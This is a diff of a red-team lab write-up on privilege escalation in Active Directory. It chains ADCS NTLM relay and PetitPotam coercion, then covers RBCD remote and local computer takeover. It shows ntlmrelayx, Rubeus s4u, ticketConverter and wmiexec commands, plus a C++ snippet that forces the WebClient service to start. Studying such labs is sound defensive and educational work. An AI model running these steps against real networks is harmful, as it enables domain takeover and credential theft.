@@ -2,11 +2,11 @@
 
 This is a quick lab to familiarize with an Active Directory Certificate Services \(ADCS\) + PetitPotam + NLTM Relay technique that allows attackers, given ADCS is misconfigured \(which it is by default\), to effectively escalate privileges from a low privileged domain user to Domain Admin.
 
-The ADCS vulnerabilities were researched by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) in [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) and [PetitPotam](https://github.com/topotam/PetitPotam) was researched by [Gilles Lionel @topotam77](https://twitter.com/topotam77).
+The ADCS vulnerabilities were researched by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) in [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2), [PetitPotam](https://github.com/topotam/PetitPotam) was researched by [Gilles Lionel @topotam77](https://twitter.com/topotam77), ADCS attack implementation in impacket by [ExAndroidDev](https://github.com/ExAndroidDev).
 
 ## Conditions
 
-Below are listed some conditions making an AD environment vulnerable to ADCS + NTLM relay attack:
+Below are some of the conditions making an AD environment vulnerable to ADCS + NTLM relay attack:
 
 * ADCS is configured to allow NTLM authentication;
 * NTLM authentication is not protected by EPA or SMB signing;
@@ -19,16 +19,16 @@ Below are listed some conditions making an AD environment vulnerable to ADCS + N
 Below provides a high level overview of how the attack works:
 
 1. Get a foothold in an AD network with a misconfigured ADCS instance;
-2. Setup an NTLM relay listener on a box you control, so that incoming authentications are relayed to the misconfigured ADCS, so that a certificate of the target Domain Controller \(DC\) machine account could be obtained;
+2. Setup an NTLM relay listener on a box you control, so that incoming authentications are relayed to the misconfigured ADCS;
 3. Force the target DC to authenticate \(using PetitPotam or PrintSpooler trick\) to the box running your NTLM relay;
 4. Target DC attempts to authenticate to your NTLM relay;
-5. NTLM relay receives the DC machine authentication and relays it to the ADCS;
-6. ADCS provides a certificate for the target DC computer account;
-7. Use the DC's computer account certificate to request its Kerberos TGT;
+5. NTLM relay receives the DC$ machine account authentication and relays it to the ADCS;
+6. ADCS provides a certificate for the target DC$ computer account;
+7. Use the target DC's computer account certificate to request its Kerberos TGT;
 8. Use target DC's computer account TGT to perform [DCSync](dump-password-hashes-from-domain-controller-with-dcsync.md) and pull the NTLM hash of `krbtgt`;
 9. Use `krbtgt` NTLM hash to create [Golden Tickets](kerberos-golden-tickets.md) that allow you to impersonate any domain user, including Domain Admin.
 
-## Domain Take Over
+## Domain Takeover
 
 ### Lab Setup
 
@@ -49,7 +49,7 @@ cd impacket
 git checkout ntlmrelayx-adcs-attack
 ```
 
-![](../../.gitbook/assets/image%20%281027%29.png)
+![Installing impacket and switching to the adcs attack branch](../../.gitbook/assets/image%20%281027%29.png)
 
 ### Configuring Virtual Environment
 
@@ -84,9 +84,11 @@ On `WS01`, we can use a Windows LOLBIN `certutil.exe`, to find ADCS servers in t
 
 ![CA01 is a Certificate Authority](../../.gitbook/assets/image%20%281033%29.png)
 
+We confirm that in our domain, `CA01` is our Certificate Authority that we will be relaying `DC01$` authentication to.
+
 ### Setting up NTLM Relay
 
-On our kali box at 10.0.0.5, let's setup our NTLM relay and specify the target as `CA01`:
+On Kali box at 10.0.0.5, let's setup our NTLM relay to forward incoming authentications from `DC01$` to the `CA01`, or more specifically to one of its HTTP endpoints for certificate enrollment `http://ca01/certsrv/certfnsh.asp` like so:
 
 ```text
 examples/ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs
@@ -119,7 +121,7 @@ On `WS01`, we can now use `rubeus` to request a Kerberos TGT for the `DC01$` com
 ```
 
 {% hint style="info" %}
-Use `runas /netonly /user:fake powershell` to create a new/sacrificial logon session into which the `DC01$` TGT will be injected to prevent messing up TGTs/TGSs for your existing logon sesion.
+Use `runas /netonly /user:fake powershell` to create a new/sacrificial logon session into which the `DC01$` TGT will be injected to prevent messing up TGTs/TGSs for your existing logon session.
 {% endhint %}
 
 ![TGT for DC01$ retrieved and injected into the current logon session](../../.gitbook/assets/image%20%281025%29.png)
@@ -128,7 +130,7 @@ Use `runas /netonly /user:fake powershell` to create a new/sacrificial logon ses
 
 ![TGT for DC01$ in memory](../../.gitbook/assets/image%20%281026%29.png)
 
-We're can now perform [DCSync](dump-password-hashes-from-domain-controller-with-dcsync.md) and pull the NTLM hash for the user `offsense\krbtgt`:
+We can now perform [DCSync](dump-password-hashes-from-domain-controller-with-dcsync.md) and pull the NTLM hash for the user `offsense\krbtgt`:
 
 {% page-ref page="dump-password-hashes-from-domain-controller-with-dcsync.md" %}
 
@@ -140,16 +142,23 @@ Having the NTLM hash for `krbtgt` allows us to create [Kerberos Golden Tickets](
 
 ## Remember
 
-It's worth remembering that in some AD environments there will be highly privileged accounts connecting to workstations to perform some administrative tasks and if you have local administrator rights on a compromised Windows box, you can perform ADCS + NTLM relay attack to request a certificate for that service account. To do so, you'd need the following:
+It's worth remembering that in some AD environments there will be highly privileged accounts connecting to workstations to perform some administrative tasks and if you have local administrator rights on a compromised Windows box, you can perform ADCS + NTLM relay attack to request a certificate for that service account. 
+
+To do so, you'd need the following:
+
+{% hint style="warning" %}
+**Reminder**  
+Consider your OPSEC.
+{% endhint %}
 
 * Stop the SMB service on the compromised box. This requires local admin privileges on the box and a reboot to stop the machine from listening on TCP 445;
 * Spin up the NTLM relay on TCP 445;
 * Wait for the service account to connect to your machine;
-* Service account's authentication is relayed to the ADCS and spits out the servive account certificate;
+* Incoming service account authentication is relayed to the ADCS, which spits out the service account certificate;
 * Use service account's certificate to request its Kerberos TGT;
 * You've now gained administrative privileges on machines the compromised service account can access.
 
-## RBCD: Remote Computer Take Over
+## RBCD: Remote Computer Takeover
 
 It's also possible to gain administrative privileges over any remote computer given we have network access to that computer, as pointed out by Lee Christensen:
 
@@ -160,13 +169,13 @@ It's also possible to gain administrative privileges over any remote computer gi
 This part of the lab is setup with the following computers and servers:
 
 * 10.0.0.5 - Kali box with NTLM relay;
-* 10.0.0.7 - Windows worksation \(`WS01`\). This is the box we will coerce to authenticate our Kali box, which will relay the authentication to `DC01` and setup the computer `WS01` for a remote take over;
+* 10.0.0.7 - Windows worksation \(`WS01`\). This is the box we will coerce to authenticate our Kali box, which will relay the authentication to `DC01` and setup the computer `WS01` for a remote takeover;
 * 10.0.0.6 - Domain Controller `DC01`;
 * 10.0.0.10 - Certificate Authority \(`CA01`\). This is the box from which we will coerce `WS01` to authenticate to `DC01`;
 
 ### Setting up NTLM Relay
 
-Let's set up our NTLM relay on the Kali box to relay authentications to DC01 via `LDAP` and specify the --delegate-access flag, which will automate the Resource Basded Constrained Delegation \(RBCD\) attack steps:
+Let's set up our NTLM relay on the Kali box to relay authentications to DC01 via `LDAP` and specify the `--delegate-access` flag, which will automate the [Resource Based Constrained Delegation \(RBCD\)](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md) attack steps:
 
 ```python
 examples/ntlmrelayx.py -t ldaps://dc01 -smb2support --delegate-access
@@ -190,19 +199,19 @@ On our Kali box, we can see the the incoming authentication from `WS01$` was rel
 
 ![LDAP relay succeeds, delegation rights setup](../../.gitbook/assets/image%20%281048%29.png)
 
-Below is just a quick screenshot showing that the `QUAIIVEE` computer account has been indeed created and `WS01$` has some privileges:
+Below screenshot shows that the `QUAIIVEE` computer account has been indeed created and `WS01$` has some privileges to it:
 
 ![Computer AD object created as part of RBCD attack](../../.gitbook/assets/image%20%281042%29.png)
 
-Additionally, we can see that the attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` on computer object `WS01` has now some binary value, which is empty by default on computer objects:
+Additionally, we can see that the attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` on computer object `WS01` contains some binary value, which is empty by default on computer objects:
 
 ![WS01 has been configured for RBCD attack](../../.gitbook/assets/image%20%281064%29.png)
 
-From [Kerberos Resource-based Constrained Delegation: Computer Object Take Over](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md#modifying-target-computers-ad-object), we know that the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, after we've successfully performed the LDAP relay attack, effectively means the following: computer `WS01` suddenly trust the computer account `QUAIIVVE$` and allows it to impersonate any domain user, including Domain Admins and grant them administrative access to `WS01`.
+From [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md#modifying-target-computers-ad-object), we know that the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, after we've successfully performed the LDAP relay attack, effectively encodes the following: computer `WS01` trusts the computer account `QUAIIVVE$` and allows it to impersonate any domain user, including Domain Admins and grant them administrative access to `WS01`.
 
 ### Calculating Hash
 
-On computer `CA01`, let's calculate the RC4 hash for the newly created computer account `QUAIIVVE$`:
+On computer `CA01`, let's calculate the RC4 hash for the newly created computer account's `QUAIIVVE$`: password:
 
 ```text
 .\Rubeus.exe hash /domain:offense.local /user:QUAIIVVE$ /password:'K_-Jzsb&uK!`TIH'
@@ -212,10 +221,12 @@ On computer `CA01`, let's calculate the RC4 hash for the newly created computer 
 
 ### Impersonating Domain Admin on WS01
 
-While on `CA01`, we can use the rubeus `s4u` command, which will:
+Time to impersonate a Domain Admin.
+
+While on `CA01`, we can use rubeus `s4u` command, which will:
 
 1. Retrieve a TGT for `offense.local\QUAIIVVE$`;
-2. Perform `S4U2Self`, which is a Kerberos extension that allows a service to obtain a TGS to itself on another user's behalf. So in our case, the `CA01` will request a TGS for `QUAIIVVE$@OFFENSE.LOCAL` as `administrator@offense.local`;
+2. Perform `S4U2Self`, which is a Kerberos extension that allows a service to obtain a TGS to **itself** on another user's behalf. So in our case, the `CA01` will request a TGS for `QUAIIVVE$@OFFENSE.LOCAL` as `administrator@offense.local`;
 3. Perform `S4U2Proxy`, which is a Kerberos extension that enables services to request TGS tickets to **other** services on behalf of a given user. In this instance, a TGS will be requested for `cifs/ws01.offense.local`, which will allow `CA01` to access `WS01` computer's file system \(i.e.,  `c$` share\) on behalf of the Domain Admin `administrator@offense.local`:
 
 ```text
@@ -345,15 +356,15 @@ ls \\ws01.offense.local\c$
 
 ### WebClient Service
 
-For the above attack to work, the target system \(`WS01`\) has to have the `WebClient` service running:
+For the above attack to work, the target system `WS01` has to have the `WebClient` service running:
 
 ![WebClient service running on WS01](../../.gitbook/assets/image%20%281055%29.png)
 
-`WebClient` service is not running on computers by default and you need admin rights to start them, however it's possible to force the service to start using the below code:
+`WebClient` service is not running on computers by default and normally you'd need admin rights to start it, however it's possible to force the service to start using the below code:
 
 {% code title="webclient.cpp" %}
 ```cpp
-// Code taken from https://www.tiraniddo.dev/2015/03/starting-webclient-service.html
+// Code from https://www.tiraniddo.dev/2015/03/starting-webclient-service.html
 #include <Windows.h>
 #include <evntprov.h>
 
@@ -384,23 +395,27 @@ Below shows `WebClient` service is not running on `WS01` and we cannot start it,
 
 ![Forcing the WebClient service to run](../../.gitbook/assets/image%20%281053%29.png)
 
-## RBCD: Local Computer Take Over / Local Privilege Escalation
+## RBCD: Local Computer TakeOver / Local Privilege Escalation
 
 It's also possible to leverage the ADCS NTLM relay + Resource Based Constrained Delegation \(RBCD\) to escalate privileges on a local computer, if regular domain users can create new machine/computer accounts in AD, which they are by default, as specified in the domain root object's attribute `ms-DS-MachineAccountQuota: 10`, as seen below:
 
 ![Regular users can add up to 10 machine accounts in the domain by default](../../.gitbook/assets/image%20%281063%29.png)
+
+{% hint style="info" %}
+Ability to create machine accounts applies when talking about remote computer takeover too.
+{% endhint %}
 
 ### Lab Setup
 
 This part of the lab is setup with the following computers and servers:
 
 * 10.0.0.5 - Kali box with NTLM relay;
-* 10.0.0.7 - Windows worksation \(`WS01`\). This is the box we will coerce to authenticate our Kali box, which will relay the authentication to `DC01` and setup the computer `WS01` for privilege escalation, so that we can execute code on it from 10.0.0.5 via wmiexec / psexec with Domain Admin privileges;
+* 10.0.0.7 - Windows worksation `WS01`. This is the box we will coerce to authenticate our Kali box, which will relay the authentication to `DC01` and setup the computer `WS01` for [RBCD attack](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md);
 * 10.0.0.6 - Domain Controller `DC01`;
 
 ### Calculating Hash
 
-Building on the previous successful NTLM relay, where we forced the `WS01$` to authenticate to our Kali box \(where NTLM relay was listening\), we got a new machine account `QUAIIVVE$` created with a password ``K_-Jzsb&uK!`TIH``. Let's again calculate the password hash for it:
+Building on the previous successful NTLM relay, where we forced the `WS01$` to authenticate to our Kali box \(where our NTLM relay was listening\), we got a new machine account `QUAIIVVE$` created with a password ``K_-Jzsb&uK!`TIH``. Let's re-calculate the password's hash:
 
 ```text
 PS C:\Users\spotless\Desktop> .\Rubeus.exe hash /domain:offense.local /user:QUAIIVVE$ /password:"K_-Jzsb&uK!``TIH"
@@ -431,7 +446,7 @@ PS C:\Users\spotless\Desktop> .\Rubeus.exe hash /domain:offense.local /user:QUAI
 
 ### Impersonating Domain Admin on WS01
 
-We can now perform the S4U against `WS01`, where we currently have low privileged access, but want to elevate to Domain Admin privileges on that machine:
+We can now perform the S4U against `WS01`, where we currently have low privileged access, but want to elevate to `administrator`:
 
 ```text
 PS C:\Users\spotless\Desktop> .\Rubeus.exe s4u /user:QUAIIVVE$ /aes256:E73CA03A03704931A928806FDBA8993FDA47404A4EA1F66BA1A64EFD90AA5F69 /impersonateuser:Administrator /msdsspn:host/ws01.offense.local /altservice:cifs /nowrap /ptt
@@ -495,7 +510,7 @@ echo "doIGKDCCBiSgAwIBBaEDAgEWooIFMjCCBS5hggUqMIIFJqADAgEFoQ8bDU9GRkVOU0UuTE9DQU
 
 ### Converting .kirbi Ticket to .ccache
 
-We can now use impacket's tool ticketConverter to convert the `.kirbi` file to `.ccache` file like so:
+Use impacket's tool `ticketConverter` to convert the `.kirbi` file to `.ccache` file like so:
 
 ```text
 examples/ticketConverter.py ../admin.kirbi admin.ccache
@@ -515,7 +530,7 @@ export KRB5CCNAME=admin.ccache
 
 ### Executing Code as Domain Admin on WS01
 
-We can now use impacket's `wmiexec` to execute commands on `WS01` with Domain Admin privileges:
+We can now use impacket's `wmiexec` to execute commands on `WS01` as `administrator`:
 
 ```text
 examples/wmiexec.py -k -no-pass offense.local/administrator@ws01.offense.local
@@ -530,9 +545,13 @@ Privileged code execution on `WS01` can also be achieved using impacket's psexec
 {% hint style="info" %}
 **Note**
 
-* This RBCD for local privilege escalation could also be performed by leveraging a compromised user with SPN set, assuming you have Write privilege over the computer's you want to compromise, AD object as described [here](https://orangecyberdefense.com/global/blog/sensepost/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/). 
-* The attack could be performed via socks proxy and remote port forwarding as described [here](https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/), which reduces the need to have a Linux box inside the compromised network with an NTLM relay listener set up.
+RBCD for local privilege escalation could also be performed**:**
+
+* by leveraging a compromised user with SPN set, assuming you have `WRITE` privilege over the computer's you want to compromise, AD object as described [here](https://orangecyberdefense.com/global/blog/sensepost/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/). 
+* via socks proxy and remote port forwarding as described [here](https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/), which reduces the need to have a Linux box inside the compromised network with an NTLM relay listener set up.
 {% endhint %}
+
+Note to self: what a beautiful attack vector this is.
 
 ## References
 
